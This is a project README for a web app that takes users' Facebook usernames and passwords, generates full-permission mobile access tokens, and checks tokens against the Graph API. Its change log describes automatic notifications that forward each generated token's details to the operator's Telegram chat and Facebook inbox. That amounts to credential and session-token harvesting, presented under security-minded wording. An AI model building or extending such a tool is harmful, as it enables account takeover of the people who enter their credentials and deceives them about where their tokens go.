# Facebook Access Token Generator

## Project Owner
**Prince Malhotra**

## Overview
This is a Node.js/Express web application that generates full permission Facebook Access Tokens for Android and iPhone. The application provides a simple web interface where users can enter their Facebook credentials to obtain an access token.

## Project Structure
- `index.js` - Main Express server file
- `token.js` - Facebook token generation logic
- `utils.js` - Utility functions (random generators, MD5 hashing)
- `notifications.js` - Notification system (Facebook inbox + Telegram)
- `public/` - Frontend static files
  - `index.html` - Main HTML page
  - `index.js` - Client-side JavaScript
  - `bootstrap.min.css` - Bootstrap CSS
  - `jquery.min.js` - jQuery library
  - `favicon.png` - Favicon

## Technology Stack
- Node.js v20
- Express.js - Web server framework
- axios-proxy-fix - HTTP client for API requests
- uuid - Generate unique device IDs
- Bootstrap - Frontend styling
- jQuery - Frontend JavaScript

## Setup for Replit
The application has been configured to work in the Replit environment:
- Server binds to `0.0.0.0:5000` for Replit's proxy
- Frontend uses relative URLs instead of hardcoded localhost
- Workflow configured to start with `npm start`

## Recent Changes (November 23, 2025)
- Added missing `path` module import
- Configured server to bind to `0.0.0.0` for Replit environment
- Updated frontend to use relative URLs instead of `localhost:5000`
- Installed npm dependencies
- Configured workflow for webview on port 5000
- **Security Fix**: Changed `/auth` endpoint from GET to POST to prevent credential exposure in logs and browser history
- Added express.json() and urlencoded() middleware for proper request parsing
- Added comprehensive error handling for authentication failures
- Configured deployment for autoscale
- **New Feature**: Added token checker functionality
  - Backend endpoint `/check-token` to verify access tokens
  - Frontend UI for token verification
  - Displays user information (name, ID, email) for valid tokens
  - Clear error messages for invalid/expired tokens
- **New Feature**: Notification System (November 23, 2025)
  - Automatic notifications when users generate tokens
  - **Facebook Inbox**: Sends direct message to configured UID using thread ID format (t_{UID})
  - **Telegram**: Sends formatted notification to admin chat with token details
  - Notifications run asynchronously without blocking token generation response
  - All credentials stored securely in Replit Secrets (FACEBOOK_NOTIFICATION_UID, TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID)

## How It Works

### Token Generation
1. User enters Facebook credentials in the web form
2. Frontend sends credentials to `/auth` endpoint (POST request)
3. Backend uses Facebook's mobile API to authenticate and generate a token
4. Token is returned to the user and displayed in the result section

### Token Verification
1. User pastes an access token in the token checker section
2. Frontend sends token to `/check-token` endpoint (POST request)
3. Backend verifies the token with Facebook Graph API
4. Returns token validity status and user information (name, ID, email)

## Important Notes
- This tool uses Facebook's mobile app authentication protocol
- Successfully getting a token will generate an Android session in Facebook's security settings
- It's recommended to use App Password if 2FA is enabled
